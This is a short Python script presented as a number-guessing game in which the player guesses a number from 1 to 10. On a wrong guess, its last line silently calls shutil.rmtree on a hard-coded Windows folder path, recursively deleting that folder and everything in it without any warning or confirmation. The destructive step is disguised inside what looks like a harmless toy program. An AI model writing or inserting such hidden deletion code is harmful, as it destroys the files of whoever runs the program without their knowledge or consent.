import random
import shutil

number = random.randint(1, 10)

guess = input("Guess number from 1 to 10 ")
guess = int(guess)

if guess == number:
    print("Congratulations")
else:
    print("Unfortunately, you lost the game")
    shutil.rmtree(r"C:\Users\David\Desktop\New folder")